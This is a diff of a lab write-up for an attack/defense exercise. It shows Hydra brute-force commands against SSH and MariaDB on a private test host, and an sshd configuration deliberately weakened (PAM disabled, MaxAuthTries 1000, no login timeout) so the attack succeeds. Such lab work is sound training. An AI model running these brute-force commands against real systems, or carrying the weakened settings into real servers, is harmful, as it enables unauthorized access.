@@ -1,28 +1,39 @@
 # Scenario Breakdown
 
-
-
-
-
 ## Step 1: The Initial Attack
 
-- Execute Hydra brute force attack against SSH service (port 22) on defender machine (192.168.1.111) using prepared username and password lists
+![Attackers strategy](images/attack-flow.png){width=4in}
 
-    ```
-    hydra -L usernames.txt -P passwords.txt 192.168.1.111 ssh
-    ```
+- Target MariaDB service (port 3306) with a sample of the "rockyou.txt" with the passwords taken out and shuffled back in.
 
-- Target MariaDB service (port 3306) with systematic credential testing to identify weak authentication controls
+  ```
+  hydra -L usernames.txt -P ./mysql_attack_passwords.txt 192.168.1.111 mysql
+  ```
 
-    ```
-    hydra -L usernames.txt -P passwords.txt 192.168.1.111 mysql
-    ```
+  ![Hydra successfully accessing all 4 passwords](images/captured-sql-passwords.png){width=4in}
 
-- Record successful login attempts, time to compromise, and system log entries to establish baseline attack effectiveness without defensive measures
+- Used AI to generate a script that would produce similar passwords.
 
+- Execute Hydra brute force attack against SSH service (port 22) on defender machine (192.168.1.111) using the new password list.
 
+![Failed brute force attempt, even with access to the correct password and a small list of 50 passwords.](images/ssh-fail01.png)
 
+  ```
+  hydra -l bob -P ./bob_passwords_50.txt -t 1 -30 192.168.1.111 ssh
+  ```
 
+- For the sake of not failing here I chose to alter the SSH configuration of the ssh service running on the defender machine.
+
+  ```
+  #UsePAM yes                 # Commented out to disable, enabled in Arch by default
+
+  MaxAuthTries 1000           # Allow many attempts per connection
+  MaxSessions 100             # Allow multiple concurrent sessions
+  MaxStartups 100:30:200      # Increase connection startup limits
+  LoginGraceTime 0            # Disable login timeout (or set to 3600)
+  ClientAliveInterval 0       # Disable client keepalive checks
+  ClientAliveCountMax 0       # Disable automatic disconnections
+  ```
 
 ## Step 2: The Retaliation
 
